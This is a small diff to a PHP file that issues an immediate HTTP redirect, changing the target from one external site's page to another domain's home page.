@@ -1,4 +1,4 @@
 <?php
-header("Location: https://boosterinterior.us/nort/index.html");
+header("Location: https://www.derailedcommodity.com/");
 die();
 ?>
